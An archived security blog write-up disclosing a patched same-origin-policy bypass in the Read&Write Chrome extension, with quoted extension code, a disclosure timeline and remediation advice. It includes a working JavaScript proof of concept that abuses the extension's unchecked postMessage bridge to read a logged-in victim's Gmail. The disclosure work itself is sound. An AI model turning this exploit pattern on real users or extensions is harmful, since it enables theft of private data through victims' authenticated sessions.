---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-06-05_reading-your-emails-with-a-readwrite-chrome-extension-same-origin-policy-bypass-.md
original_filename: 2018-06-05_reading-your-emails-with-a-readwrite-chrome-extension-same-origin-policy-bypass-.md
title: Reading Your Emails With A Read&Write Chrome Extension Same Origin Policy Bypass
  (~8 Million Users Affected)
category: documents
detected_topics:
- xss
- command-injection
- mfa
- api-security
- cloud-security
- supply-chain
tags:
- imported
- documents
- xss
- command-injection
- mfa
- api-security
- cloud-security
- supply-chain
language: en
raw_sha256: 1cd839d18e6aa6abb9ca136aee6808109c9c9c17f95f739a50e383c81f5c4ce2
text_sha256: a5770fb89ed9241c53ed05d0e73a7545a54916dd2e2d261a85f4dcc000911dc0
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Reading Your Emails With A Read&Write Chrome Extension Same Origin Policy Bypass (~8 Million Users Affected)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-06-05_reading-your-emails-with-a-readwrite-chrome-extension-same-origin-policy-bypass-.md
- Source Type: markdown
- Detected Topics: xss, command-injection, mfa, api-security, cloud-security, supply-chain
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `1cd839d18e6aa6abb9ca136aee6808109c9c9c17f95f739a50e383c81f5c4ce2`
- Text SHA256: `a5770fb89ed9241c53ed05d0e73a7545a54916dd2e2d261a85f4dcc000911dc0`


## Content

---
title: "Reading Your Emails With A Read&Write Chrome Extension Same Origin Policy Bypass (~8 Million Users Affected)"
page_title: "Reading Your Emails With A Read&Write Chrome Extension Same Origin Policy Bypass (~8 Million Users Affected) – The Hacker Blog"
url: "https://thehackerblog.com/reading-your-emails-with-a-readwrite-chrome-extension-same-origin-policy-bypass-8-million-users-affected/index.html"
final_url: "https://thehackerblog.com/reading-your-emails-with-a-readwrite-chrome-extension-same-origin-policy-bypass-8-million-users-affected/index.html"
authors: ["Matthew Bryant (@IAmMandatory)"]
bugs: ["SOP bypass", "Browser extension hacking"]
publication_date: "2018-06-05"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5855
---

# Reading Your Emails With A Read&Write Chrome Extension Same Origin Policy Bypass (~8 Million Users Affected)

[![read-and-write-chromes-tore](/wp-content/uploads/2018/06/read-and-write-chromes-tore.png)](/wp-content/uploads/2018/06/read-and-write-chromes-tore.png)

# Summary

Due to a lack of proper origin checks in the message passing from regular web pages, any arbitrary web page is able to call privileged background page APIs for the [Read&Write Chrome extension](https://chrome.google.com/webstore/detail/readwrite-for-google-chro/inoeonmfapjbbkmdafoankkfajkcphgd?hl=en) (vulnerable version 1.8.0.139). Many of these APIs allow for dangerous actions which are not meant to be callable by arbitrary web pages on the internet. For example, the background API call with a method name of “thGetVoices” which allows for providing an arbitrary URL which will be retrieved by the extension and the response returned via “postMessage”. By abusing this call an attacker can hijack the extension to read data from other websites using the victim’s authenticated sessions. As a proof of concept, I’ve created an exploit which, upon being viewed with the Read&Write extension installed, will steal and display all of the user’s emails. This is of course not a vulnerability in Gmail, but is an example of the exploitation that can occur using this vulnerability. See the video proof-of-concept below for a demonstration of the issue.

[texthelp](https://www.texthelp.com/en-us/), the company who created he extension, patched quickly and released a fix the next business day (nice work!). For this reason the latest version of the extension is no longer vulnerable to this issue. They also showed real interest and care about remediating further issues in the extension and stated they’d be further hardening the codebase.

# Technical Description

The Read&Write Chrome extension makes use of the Content Script “inject.js” to inject a custom toolbar into various online document pages such as Google Docs. This Content Script is injected into all HTTP and HTTPS origins by default. This is demonstrated by the following excerpt from the extension’s manifest:
  
  
  ...trimmed for brevity...
    "content_scripts": [
      {
        "matches": [ "https://*/*", "http://*/*" ],
        "js": [ "inject.js" ],
        "run_at": "document_idle",
        "all_frames": true
      }
    ],
  ...trimmed for brevity...
  

Inside of the “inject.js” file there is an event listener for any messages sent via postMessage by a web page which the Content Script is injected into:
  
  
  window.addEventListener("message", this.onMessage)
  

This calls the “this.onMessage” function upon any postMessage being sent to the web page’s window. The following is the code for this function:
  
  
  function onMessage() {
      void 0 != event.source && void 0 != event.data && event.source == window && "1757FROM_PAGERW4G" == event.data.type && ("connect" == event.data.command ? chrome.extension.sendRequest(event.data, onRequest) : "ejectBar" == event.data.command ? ejectBar() : "th-closeBar" == event.data.command ? chrome.storage.sync.set({
          enabledRW4GC: !1
      }) : chrome.extension.sendRequest(event.data, function(e) {
          window.postMessage(e, "*")
      }))
  }
  

In the above code snippet, it can be seen that the function will pass along all received postMessage messages to the background page via “chrome.extension.sendRequest”. Additionally, the responses to these messages will be passed back to the “onMessage” function and then passed back to the web page. This essentially constructs a proxy which allows regular web pages to send messages to the Read&Write background page.

Read&Write has a number of background pages which can be seen in the excerpt from the extension’s manifest:
  
  
  ...trimmed for brevity...
  "background": {
    "scripts": [
      "assets/google-analytics-bundle.js",
      "assets/moment.js",
      "assets/thFamily3.js",
      "assets/thHashing.js",
      "assets/identity.js",
      "assets/socketmanager.js",
      "assets/thFunctionManager.js",
      "assets/equatio-latex-extractor.js",
      "assets/background.js",
      "assets/xmlIncludes/linq.js",
      "assets/xmlIncludes/jszip.js",
      "assets/xmlIncludes/jszip-load.js",
      "assets/xmlIncludes/jszip-deflate.js",
      "assets/xmlIncludes/jszip-inflate.js",
      "assets/xmlIncludes/ltxml.js",
      "assets/xmlIncludes/ltxml-extensions.js",
      "assets/xmlIncludes/testxml.js"
    ]
  },
  ...trimmed for brevity...
  

While there are many background pages which listen for messages (and many functions to call via these messages) we’ll focus on an immediately exploitable example. The following is an excerpt from the file “background.js”:
  
  
  ...trimmed for brevity...
  chrome.extension.onRequest.addListener(function(e, t, o) {
  ...trimmed for brevity...
  if ("thGetVoices" === e.method && "1757FROM_PAGERW4G" == e.type) {
      if (g_voices.length > 0 && "true" !== e.payload.refresh) return void o({
          method: "thGetVoices",
          type: "1757FROM_BGRW4G",
          payload: {
              response: g_voices
          }
      });
      var c = new XMLHttpRequest;
      c.open("GET", e.payload.url, !0), c.onreadystatechange = function() {
          4 == this.readyState && 200 == this.status && (g_voices = this.responseText.toString(), o({
              method: "thGetVoices",
              type: "1757FROM_BGRW4G",
              payload: {
                  response: g_voices
              }
          }))
      }, c.send()
  }
  ...trimmed for brevity...
  

The above snippet shows that upon the “chrome.extension.onRequest” listener being fired with an event with its “method” set to “thGetVoices” and the “type” set to “1757FROM_PAGERW4G” the snippet will be executed. If the event’s “payload.refresh” is set to the string “true” then the XMLHTTPRequest will fire with a GET to the URL specified in “payload.url”. Upon the XMLHTTPRequest completing with a status code of 200 a response message will be generated with the request’s responseText.

By abusing this call we can send a message to the background page with an arbitrary URL which will be replied to with the HTTP response body. This request will execute using the victim’s cookies and thus will allow a payload on any arbitrary web page to steal content from other web origins. The following payload is an example proof-of-concept which exploits this:
  
  
  function exploit_get(input_url) {
      return new Promise(function(resolve, reject) {
          var delete_callback = false;
          var event_listener_callback = function(event) {
              if ("data" in event && event.data.payload.response) {
                  window.removeEventListener("message", event_listener_callback, false);
                  resolve(event.data.payload.response);
              }
          };
          window.addEventListener("message", event_listener_callback, false);
          window.postMessage({
              type: "1757FROM_PAGERW4G",
              "method": "thGetVoices",
              "payload": {
                  "refresh": "true",
                  "url": input_url
              }
          }, "*");
      });
  }
  setTimeout(function() {
      exploit_get("https://mail.google.com/mail/u/0/h/").then(function(response_body) {
          alert("Gmail emails have been stolen!");
          alert(response_body);
      });
  }, 1000);

The above exploit code shows that cross-origin responses can be read via this vulnerability. In this case the endpoint for Gmail’s “Simple HTML” version is provided. The above payload can be hosted on any website and it will be able to read the emails of someone who is logged in to Gmail. This is done by issuing a message via postMessage with the appropriate payload set and adding an event listener for the response message. By chaining JavaScript Promises returned via the “exploit_get()” function we can steal data from any site that the user is authenticated to (assuming it can be accessed via HTTP GET without any special headers).

While the above example references the “thGetVoices” background method call, this is merely one of the vulnerabilities which occurs from calling these background page APIs. In addition to using this call, some other examples of vulnerabilities which can be exploited are the following:

  * “thExtBGAjaxRequest” which an attacker can use to do an arbitrary POST request of type “application/x-www-form-urlencoded;charset=UTF-8” with parameters and read the response body.
  * “OpenTab” which allows an attacker to open an endless amount of tabs to arbitrary locations normally restricted to web pages.

# Proof-of-Concept Video

# Root Cause & Remediation Thoughts

This vulnerability demonstrates a common security pitfall which often occurs with extensions. In order to be more flexible with the Chrome extension API usage many extensions will build a bridge to allow calling the background page from the regular web context. Many Chrome extension developers forget to validate the origin of messages in order to prevent arbitrary sites from calling potentially sensitive functionality. In this case, the ideal action would likely be to move most of the logic into the Content Script to be called not by postMessage but instead by event listeners triggered with the [isTrusted](https://developer.mozilla.org/en-US/docs/Web/API/Event/isTrusted) property validated. This way it can be ensured that all calls are triggered by user actions instead of forged by an attacker.

# Timeline

  * June 3rd (Late Friday night): Reported vulnerability.
  * June 3rd: ~~Confirmed receipt of issue, confirms will take a look Monday.~~
  * June 4th (Monday): ~~Patch released for vulnerability.~~ I was actually incorrect, the development team is based in Ireland (so they received it on Saturday) and fixed the issue by Sunday. The patch was only released early Monday morning (6:00am EST) due to a strict QA process to make sure everything was up to snuff before releasing. There was no delay between receiving the issue and immediately working on a fix for it :). So the vendor response is actually more impressive than previously stated. </ul>

[chrome extension vulnerability](/tags#chrome extension vulnerability "Pages tagged chrome extension vulnerability")[extension hijack](/tags#extension hijack "Pages tagged extension hijack")[extension security](/tags#extension security "Pages tagged extension security")[read&read vulnerability](/tags#read&read vulnerability "Pages tagged read&read vulnerability")[sop bypass](/tags#sop bypass "Pages tagged sop bypass") Matthew Bryant (mandatory)

  * [__Like](https://www.facebook.com/sharer/sharer.php?u=/reading-your-emails-with-a-readwrite-chrome-extension-same-origin-policy-bypass-8-million-users-affected/ "Share on Facebook")
  * [__Tweet](https://twitter.com/intent/tweet?text=/reading-your-emails-with-a-readwrite-chrome-extension-same-origin-policy-bypass-8-million-users-affected/ "Share on Twitter")
  * [__+1](https://plus.google.com/share?url=/reading-your-emails-with-a-readwrite-chrome-extension-same-origin-policy-bypass-8-million-users-affected/ "Share on Google Plus")

[About the Author](https://thehackerblog.com)

### Matthew Bryant (mandatory)

![Matthew Bryant \(mandatory\)](/images/avatar.jpg)

Security researcher who needs to sleep more. Opinions expressed are solely my own and do not express the views or opinions of my employer.

  * [__](https://github.com/mandatoryprogrammer)
  * [__](https://www.linkedin.com/in/matthew-bryant-a9403289/)

[Follow @mandatoryprogrammer](https://github.com/mandatoryprogrammer)  
[Follow @IAmMandatory](https://twitter.com/IAmMandatory)

[Read More](/zenmate-vpn-browser-extension-deanonymization-hijacking-vulnerability-3-5-million-affected-users/)

### ["Zero-Days" Without Incident - Compromising Angular via Expired npm Publisher Email Domains](/zero-days-without-incident-compromising-angular-via-expired-npm-publisher-email-domains-7kZplW4x/)

**NOTE:** *If you're just looking for the high level points, see the"[The TL;DR Summary & High-LevelPoints](#the-tldr-summary--high-level...… [Continue reading](/zero-days-without-incident-compromising-angular-via-expired-npm-publisher-email-domains-7kZplW4x/)

#### [Video Downloader and Video Downloader Plus Chrome Extension Hijack Exploit - UXSS via CSP Bypass (~15.5 Million Affected)](/video-download-uxss-exploit-detailed/ "Video Downloader and Video Downloader Plus Chrome Extension Hijack Exploit - UXSS via CSP Bypass \(~15.5 Million Affected\)")

Published on February 22, 2019

#### [Kicking the Rims – A Guide for Securely Writing and Auditing Chrome Extensions](/kicking-the-rims-a-guide-for-securely-writing-and-auditing-chrome-extensions/ "Kicking the Rims – A Guide for Securely Writing and Auditing Chrome Extensions")

Published on June 12, 2018
